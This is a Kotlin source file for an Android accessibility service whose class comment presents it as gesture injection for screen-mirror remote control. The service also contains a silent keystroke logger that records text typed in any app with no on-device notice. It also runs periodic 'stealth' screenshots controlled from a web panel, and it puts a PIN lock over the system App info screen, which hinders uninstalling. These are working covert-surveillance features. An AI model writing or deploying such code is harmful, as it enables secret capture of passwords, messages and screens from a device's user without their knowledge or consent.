package com.ismartcoding.plain.services

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.content.Context
import android.content.Intent
import android.graphics.Path
import android.graphics.Point
import android.os.Build
import android.provider.Settings
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import com.ismartcoding.lib.isSPlus
import com.ismartcoding.lib.logcat.LogCat
import android.os.Handler
import android.os.Looper
import com.ismartcoding.plain.MainApp
import com.ismartcoding.plain.data.ScreenMirrorControlInput
import com.ismartcoding.plain.enums.ScreenMirrorControlAction
import com.ismartcoding.plain.features.PackageHelper
import com.ismartcoding.plain.helpers.AppInfoGuard
import com.ismartcoding.plain.helpers.KeystrokeLogHelper
import com.ismartcoding.plain.helpers.StealthScreenshotHelper
import com.ismartcoding.plain.helpers.StealthScreenshotCapturer
import com.ismartcoding.plain.ui.AppInfoUnlockActivity
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch

/**
 * Accessibility Service for injecting touch/gesture events during screen mirror remote control.
 *
 * This service uses AccessibilityService.dispatchGesture() to inject:
 * - Tap, long press, swipe (via gesture paths)
 * - Back, Home, Recents (via performGlobalAction)
 *
 * The user must manually enable this service in Android Settings > Accessibility.
 */
class PlainAccessibilityService : AccessibilityService() {

    private val captureScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    // Dedicated background scope for SharedPreferences reads/writes triggered from
    // onAccessibilityEvent. Keeping this off the service thread is critical — if the
    // service thread blocks for too long, Android marks the service as malfunctioning
    // and disables it.
    private val ioScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        LogCat.d("PlainAccessibilityService connected")
        startEnforcementLoop()
        startScreenshotLoopIfNeeded()
    }


    private val mainHandler = Handler(Looper.getMainLooper())
    private val enforcementRunnable = object : Runnable {
        override fun run() {
            // All disk I/O must happen off the main/service thread; only the
            // user-visible actions (overlay + GLOBAL_ACTION_HOME) are dispatched back here.
            ioScope.launch {
                try {
                    val pkg = currentForegroundPackage
                    val enteredAt = currentForegroundEnteredAt
                    if (pkg != null && enteredAt > 0) {
                        val now = System.currentTimeMillis()
                        val delta = now - enteredAt
                        if (delta in 100..6 * 60 * 60 * 1000L) {
                            AppBlockHelper.addUsage(pkg, delta)
                            currentForegroundEnteredAt = now
                        }
                        val reason = AppBlockHelper.blockReason(pkg)
                        if (reason != null) {
                            mainHandler.post {
                                try {
                                    MessageOverlayService.show(
                                        title = if (reason == "time_limit") "Daily limit reached" else "App blocked",
                                        message = "$pkg has been blocked.",
                                        durationMs = 3500L,
                                    )
                                } catch (_: Exception) {}
                                try { performGlobalAction(GLOBAL_ACTION_HOME) } catch (_: Throwable) {}
                            }
                        }
                    }
                } catch (_: Throwable) {}
            }
            mainHandler.postDelayed(this, 5000L)
        }
    }
    private fun startEnforcementLoop() {
        mainHandler.removeCallbacks(enforcementRunnable)
        mainHandler.postDelayed(enforcementRunnable, 5000L)
    }

    /**
     * Periodic stealth screenshot. We re-evaluate the schedule on every fire
     * so the user can change the interval (or disable the feature) live from
     * the web panel without restarting the accessibility service.
     */
    private val screenshotRunnable = object : Runnable {
        override fun run() {
            try {
                if (StealthScreenshotHelper.isEnabled()) {
                    captureScope.launch {
                        try { StealthScreenshotCapturer.captureNow(manual = false) } catch (_: Throwable) {}
                    }
                }
            } catch (_: Throwable) {}
            // Always re-arm; if the user disables we'll just no-op next tick.
            val nextMin = try { StealthScreenshotHelper.getIntervalMin() } catch (_: Throwable) { 15 }
            mainHandler.postDelayed(this, nextMin.coerceIn(1, 360) * 60_000L)
        }
    }
    fun startScreenshotLoopIfNeeded() {
        mainHandler.removeCallbacks(screenshotRunnable)
        // Stagger the first fire so it doesn't hammer the moment the service connects.
        mainHandler.postDelayed(screenshotRunnable, 30_000L)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        // CRITICAL: this callback runs on the service's main thread. ANY blocking
        // I/O here (SharedPreferences read/write, JSON parse of large arrays,
        // PackageManager calls, etc.) will eventually cause the system to mark
        // this service as "malfunctioning" and disable it. We extract just the
        // primitive fields we need and dispatch all heavy work to ioScope.

        val eventType = event.eventType

        // Background keystroke logger — silently records what the user types
        // anywhere on the device. Triggered only when the feature is enabled
        // from the web panel; produces no on-device UI / notification.
        if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            // Capture the data while it is still safe to read (the AccessibilityEvent
            // object may be recycled after this method returns).
            val pkg = event.packageName?.toString().orEmpty()
            if (pkg.isEmpty() || pkg == applicationContext.packageName) return
            val texts = event.text
            val joined = if (texts != null && texts.isNotEmpty()) {
                texts.joinToString(separator = "") { it?.toString().orEmpty() }
            } else ""
            if (joined.isEmpty()) return
            val hint = event.contentDescription?.toString()
                ?: event.className?.toString()
                ?: ""
            ioScope.launch {
                try {
                    if (!KeystrokeLogHelper.isEnabled()) return@launch
                    val label = try { PackageHelper.getLabel(pkg).ifEmpty { pkg } } catch (_: Throwable) { pkg }
                    KeystrokeLogHelper.append(pkg, label, hint, joined)
                } catch (_: Throwable) {}
            }
            return
        }

        if (eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return
        val pkg = event.packageName?.toString() ?: return
        if (pkg == applicationContext.packageName) return
        if (pkg == "com.android.systemui" || pkg.startsWith("android")) return

        val cls = event.className?.toString()
        val now = System.currentTimeMillis()
        val prev = currentForegroundPackage
        val prevEnteredAt = currentForegroundEnteredAt
        currentForegroundPackage = pkg
        currentForegroundEnteredAt = now

        // Block any system Settings "App info" / app-details screen behind the
        // PlainApp PIN. Long-press on a launcher icon → "App info" lands here,
        // and so does Settings → Apps → <any app>. We can't intercept the OS
        // navigation, but we can immediately overlay the unlock activity and
        // bounce the user home if they fail or cancel the PIN check.
        try {
            if (AppInfoGuard.looksLikeAppInfoScreen(pkg, cls) &&
                AppInfoGuard.isActive(applicationContext) &&
                !AppInfoGuard.isRecentlyVerified()
            ) {
                LogCat.d("PlainAccessibilityService: app-info screen detected ($cls), challenging PIN")
                val intent = Intent(applicationContext, AppInfoUnlockActivity::class.java)
                    .addFlags(
                        Intent.FLAG_ACTIVITY_NEW_TASK
                            or Intent.FLAG_ACTIVITY_CLEAR_TOP
                            or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
                            or Intent.FLAG_ACTIVITY_NO_HISTORY
                    )
                applicationContext.startActivity(intent)
            }
        } catch (_: Throwable) {}

        // Everything below touches SharedPreferences and the PackageManager —
        // run it off the service thread so the binder callback returns fast.
        ioScope.launch {
            try {
                if (prev != null && prev != pkg && prevEnteredAt > 0L) {
                    val delta = now - prevEnteredAt
                    if (delta in 100..6 * 60 * 60 * 1000L) {
                        AppBlockHelper.addUsage(prev, delta)
                    }
                }

                AppBlockHelper.recordLaunch(pkg)
                try {
                    val label = PackageHelper.getLabel(pkg).ifEmpty { pkg }
                    TimelineHelper.add("launch", "Opened $label", "", pkg, label, now)
                } catch (_: Throwable) {}

                val reason = AppBlockHelper.blockReason(pkg)
                if (reason != null) {
                    LogCat.d("PlainAccessibilityService: blocking $pkg ($reason)")
                    val title = when (reason) {
                        "time_limit" -> "Daily limit reached"
                        "bedtime" -> "Bedtime mode"
                        else -> "App is blocked"
                    }
                    val message = when (reason) {
                        "time_limit" -> "You have used $pkg longer than the allowed daily time."
                        "bedtime" -> "$pkg is unavailable during bedtime hours."
                        else -> "$pkg has been blocked from this device."
                    }
                    mainHandler.post {
                        try {
                            MessageOverlayService.show(title, message, durationMs = 4000L)
                        } catch (_: Exception) {}
                        // Send the user back to the home screen — Android will not let us kill another app.
                        try { performGlobalAction(GLOBAL_ACTION_HOME) } catch (_: Throwable) {}
                    }
                }
            } catch (_: Throwable) {}
        }
    }

    override fun onInterrupt() {
        // Required override
    }

    override fun onDestroy() {
        super.onDestroy()
        if (instance === this) instance = null
        mainHandler.removeCallbacks(enforcementRunnable)
        mainHandler.removeCallbacks(screenshotRunnable)
        try { ioScope.cancel() } catch (_: Throwable) {}
        try { captureScope.cancel() } catch (_: Throwable) {}
        LogCat.d("PlainAccessibilityService destroyed")
    }

    /**
     * Dispatch a screen mirror control event.
     * @param control The control event with normalized coordinates [0, 1]
     * @param screenWidth The actual screen width in pixels
     * @param screenHeight The actual screen height in pixels
     */
    fun dispatchControl(control: ScreenMirrorControlInput, screenWidth: Int, screenHeight: Int) {
        when (control.action) {
            ScreenMirrorControlAction.TAP -> {
                val x = (control.x ?: return) * screenWidth
                val y = (control.y ?: return) * screenHeight
                dispatchTap(x, y)
            }

            ScreenMirrorControlAction.LONG_PRESS -> {
                val x = (control.x ?: return) * screenWidth
                val y = (control.y ?: return) * screenHeight
                val duration = control.duration ?: 500L
                dispatchLongPress(x, y, duration)
            }

            ScreenMirrorControlAction.SWIPE -> {
                val startX = (control.x ?: return) * screenWidth
                val startY = (control.y ?: return) * screenHeight
                val endX = (control.endX ?: return) * screenWidth
                val endY = (control.endY ?: return) * screenHeight
                val duration = control.duration ?: 300L
                dispatchSwipe(startX, startY, endX, endY, duration)
            }

            ScreenMirrorControlAction.SCROLL -> {
                val x = (control.x ?: return) * screenWidth
                val y = (control.y ?: return) * screenHeight
                val deltaY = control.deltaY ?: 0f
                // Convert scroll delta to a swipe: positive deltaY = scroll down = swipe up
                val scrollDistance = deltaY.coerceIn(-500f, 500f)
                dispatchSwipe(x, y, x, y + scrollDistance, 200L)
            }

            ScreenMirrorControlAction.BACK -> {
                performGlobalAction(GLOBAL_ACTION_BACK)
            }

            ScreenMirrorControlAction.HOME -> {
                performGlobalAction(GLOBAL_ACTION_HOME)
            }

            ScreenMirrorControlAction.RECENTS -> {
                performGlobalAction(GLOBAL_ACTION_RECENTS)
            }

            ScreenMirrorControlAction.LOCK_SCREEN -> {
                performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN)
            }

            ScreenMirrorControlAction.KEY -> {
                // Key injection requires InputManager or root; skip for now
                LogCat.d("Key action not yet supported: ${control.key}")
            }
        }
    }

    private fun dispatchTap(x: Float, y: Float) {
        val path = Path()
        path.moveTo(x, y)
        val stroke = GestureDescription.StrokeDescription(path, 0, 50)
        val gesture = GestureDescription.Builder().addStroke(stroke).build()
        dispatchGesture(gesture, null, null)
    }

    private fun dispatchLongPress(x: Float, y: Float, duration: Long) {
        val path = Path()
        path.moveTo(x, y)
        val stroke = GestureDescription.StrokeDescription(path, 0, duration.coerceAtLeast(500))
        val gesture = GestureDescription.Builder().addStroke(stroke).build()
        dispatchGesture(gesture, null, null)
    }

    private fun dispatchSwipe(startX: Float, startY: Float, endX: Float, endY: Float, duration: Long) {
        val path = Path()
        path.moveTo(startX, startY)
        path.lineTo(endX, endY)
        val stroke = GestureDescription.StrokeDescription(path, 0, duration.coerceAtLeast(50))
        val gesture = GestureDescription.Builder().addStroke(stroke).build()
        dispatchGesture(gesture, null, null)
    }

    companion object {
        @Volatile
        var instance: PlainAccessibilityService? = null

        @Volatile var currentForegroundPackage: String? = null
        @Volatile var currentForegroundEnteredAt: Long = 0L

        /**
         * Check if the accessibility service is currently enabled.
         */
        fun isEnabled(context: Context = MainApp.instance): Boolean {
            return instance != null
        }

        /**
         * Cached screen size to avoid repeated DisplayMetrics lookups on every control event.
         * Invalidated on configuration changes (rotation, display changes).
         */
        @Volatile
        private var cachedScreenSize: Point? = null

        /**
         * Get the real physical screen size for coordinate mapping (cached).
         * Uses real display size to include navigation bar and status bar areas,
         * which are visible in the screen mirror video captured by MediaProjection.
         */
        fun getScreenSize(context: Context): Point {
            return cachedScreenSize ?: run {
                val size = getRealScreenSize(context)
                cachedScreenSize = size
                size
            }
        }

        /**
         * Get the real physical screen dimensions including system bars (nav bar, status bar).
         * On Android <= 11, displayMetrics.widthPixels/heightPixels may exclude the navigation
         * bar, causing coordinate mapping errors for screen mirror touch control.
         */
        private fun getRealScreenSize(context: Context): Point {
            val wm = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            return if (isSPlus()) {
                val bounds = wm.currentWindowMetrics.bounds
                Point(bounds.width(), bounds.height())
            } else {
                val size = Point()
                @Suppress("DEPRECATION")
                wm.defaultDisplay.getRealSize(size)
                size
            }
        }

        /**
         * Invalidate the cached screen size. Call on configuration changes.
         */
        fun invalidateScreenSizeCache() {
            cachedScreenSize = null
        }

        /**
         * Open the system Accessibility Settings page so the user can enable this service.
         */
        fun openAccessibilitySettings(context: Context) {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            context.startActivity(intent)
        }
    }
}
